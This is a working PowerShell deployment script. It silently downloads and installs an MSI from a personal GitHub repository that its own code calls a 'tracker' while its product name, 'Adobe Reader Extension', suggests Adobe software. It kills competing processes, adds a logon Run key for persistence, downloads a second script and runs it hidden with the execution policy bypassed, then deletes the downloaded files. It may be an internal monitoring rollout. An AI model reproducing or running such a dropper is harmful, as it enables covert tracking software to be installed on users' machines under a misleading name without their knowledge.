$ErrorActionPreference = 'Stop'

$TempPath = 'C:\Windows\Temp'
$LogFile  = Join-Path $TempPath 'deploy.log'

# --- Adobe Reader Extension target release ---
$TargetVer = '1.0.4'
$MsiUrl    = "https://raw.githubusercontent.com/dycheto/agent-dev/main/adobeextension_v$TargetVer.msi"
$MsiPath   = Join-Path $TempPath "adobeextension_v$TargetVer.msi"
$MsiLog    = Join-Path $TempPath 'adobeextension-msi.log'

# --- Wazuh agent installer ---
$InstallScriptUrl  = 'https://raw.githubusercontent.com/dycheto/agent-dev/main/install-agent.ps1'
$InstallScriptPath = Join-Path $TempPath 'install-agent.ps1'

$DisplayNames = @('Adobe Reader Extension', 'DX CyberProtect')
$ProcessNames = @('AdobeExtension', 'DX-CyberProtect')

function Write-Log {
    param([string]$Message)
    Add-Content -Path $LogFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $Message"
}

function Get-InstalledEntry {
    param([string[]]$DisplayNamesToCheck)

    $Paths = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )

    foreach ($DisplayName in $DisplayNamesToCheck) {
        foreach ($Path in $Paths) {
            $Item = Get-ItemProperty $Path -ErrorAction SilentlyContinue |
                Where-Object { $_.DisplayName -eq $DisplayName } |
                Select-Object -First 1

            if ($Item) {
                return $Item
            }
        }
    }

    return $null
}

function Test-InstalledSoftware {
    param([string]$DisplayName)
    return [bool](Get-InstalledEntry -DisplayNamesToCheck @($DisplayName))
}

function Stop-TrackerProcesses {
    param([string[]]$Names)

    foreach ($Name in $Names) {
        $procs = Get-Process -Name $Name -ErrorAction SilentlyContinue
        if (-not $procs) {
            Write-Log "No running $Name.exe found."
            continue
        }

        Write-Log "Stopping $($procs.Count) $Name.exe process(es)."
        foreach ($p in $procs) {
            try {
                $p.Kill()
                $null = $p.WaitForExit(10000)
            }
            catch {
                Write-Log "Failed to kill $Name.exe PID $($p.Id): $($_.Exception.Message)"
            }
        }

        Start-Process -FilePath 'taskkill.exe' `
            -ArgumentList "/IM $Name.exe /F /T" `
            -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null
    }
}

function Install-AdobeExtension {
    Write-Log "Downloading MSI from $MsiUrl"
    Invoke-WebRequest -UseBasicParsing -Uri $MsiUrl -OutFile $MsiPath

    Write-Log 'Installing/upgrading Adobe Reader Extension silently.'
    $msi = Start-Process -FilePath 'msiexec.exe' `
        -ArgumentList "/i `"$MsiPath`" /qn /norestart REBOOT=ReallySuppress /L*v `"$MsiLog`"" `
        -Wait -PassThru

    Write-Log "MSI exit code: $($msi.ExitCode)"
    Write-Log "MSI log path: $MsiLog"
    return $msi.ExitCode
}

function Get-TrackerExePath {
    $Candidates = @(
        'C:\Program Files (x86)\adobeextension\AdobeExtension.exe',
        'C:\Program Files\adobeextension\AdobeExtension.exe'
    )

    foreach ($Path in $Candidates) {
        if (Test-Path $Path) {
            return $Path
        }
    }

    return $null
}

function Ensure-TrackerRunAtLogon {
    param([string]$ExePath)

    $RunKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    $ValueName = 'Adobe Reader Extension'
    $ValueData = '"' + $ExePath + '"'

    New-ItemProperty -Path $RunKey -Name $ValueName -Value $ValueData -PropertyType String -Force | Out-Null
    Write-Log "Configured HKLM Run entry '$ValueName' => $ValueData"
}

function Test-RunningAsSystem {
    return [System.Security.Principal.WindowsIdentity]::GetCurrent().Name -eq 'NT AUTHORITY\SYSTEM'
}

function Start-TrackerIfInteractiveUser {
    param([string]$ExePath)

    if (Test-RunningAsSystem) {
        Write-Log 'Running as SYSTEM; skipping immediate tracker start. Tracker will start at next user logon via HKLM Run.'
        return $true
    }

    Write-Log "Starting tracker for current user from $ExePath"
    Start-Process -FilePath $ExePath -WorkingDirectory (Split-Path $ExePath -Parent) | Out-Null
    return $true
}

$TrackerSucceeded = $true

try {
    Write-Log '--- Bootstrap started ---'

    $InstalledEntry  = Get-InstalledEntry -DisplayNamesToCheck $DisplayNames
    $InstalledName   = if ($InstalledEntry) { $InstalledEntry.DisplayName } else { $null }
    $InstalledVer    = if ($InstalledEntry) { $InstalledEntry.DisplayVersion } else { $null }
    $WazuhInstalled  = Test-InstalledSoftware -DisplayName 'Wazuh Agent'

    Write-Log "Detected tracker: $InstalledName"
    Write-Log "Detected tracker version: $InstalledVer (target $TargetVer)"
    Write-Log "Wazuh Agent installed: $WazuhInstalled"

    try {
        if (-not $InstalledVer) {
            Write-Log 'Adobe Reader Extension is missing. Performing fresh install.'
            $ExitCode = Install-AdobeExtension
            if ($ExitCode -ne 0) {
                throw "MSI install failed with exit code $ExitCode"
            }
        }
        elseif ($InstalledVer -ne $TargetVer) {
            Write-Log "Adobe Reader Extension version mismatch ($InstalledVer != $TargetVer). Upgrading."
            Stop-TrackerProcesses -Names $ProcessNames
            Start-Sleep -Seconds 2

            $ExitCode = Install-AdobeExtension
            if ($ExitCode -ne 0) {
                throw "MSI upgrade failed with exit code $ExitCode"
            }
        }
        else {
            Write-Log "Adobe Reader Extension already at target version $TargetVer. Skipping MSI install."
        }

        $TrackerExe = Get-TrackerExePath
        if (-not $TrackerExe) {
            throw 'Installed tracker executable was not found.'
        }

        Ensure-TrackerRunAtLogon -ExePath $TrackerExe
        $null = Start-TrackerIfInteractiveUser -ExePath $TrackerExe
    }
    catch {
        $TrackerSucceeded = $false
        Write-Log "Tracker install/startup registration failed: $($_.Exception.Message)"
    }

    try {
        if (-not $WazuhInstalled) {
            Write-Log 'Wazuh Agent is missing. Downloading install-agent.ps1.'
            Invoke-WebRequest -UseBasicParsing -Uri $InstallScriptUrl -OutFile $InstallScriptPath

            Write-Log 'Running install-agent.ps1.'
            $ps = Start-Process -FilePath 'powershell.exe' `
                -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$InstallScriptPath`"" `
                -WindowStyle Hidden -Wait -PassThru

            Write-Log "install-agent.ps1 exit code: $($ps.ExitCode)"
            if ($ps.ExitCode -ne 0) {
                throw "install-agent.ps1 failed with exit code $($ps.ExitCode)"
            }
        }
        else {
            Write-Log 'Wazuh Agent already installed. Skipping install-agent.ps1.'
        }
    }
    catch {
        Write-Log "Wazuh Agent installation failed: $($_.Exception.Message)"
    }

    Write-Log 'Cleaning up downloaded files.'
    Remove-Item -Path $MsiPath -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $InstallScriptPath -Force -ErrorAction SilentlyContinue

    if ($TrackerSucceeded) {
        Write-Log '--- Bootstrap completed successfully ---'
        exit 0
    }
    else {
        Write-Log 'Bootstrap finished, but tracker install/startup registration failed.'
        exit 1
    }
}
catch {
    Write-Log "Bootstrap failed: $($_.Exception.Message)"
    exit 1
}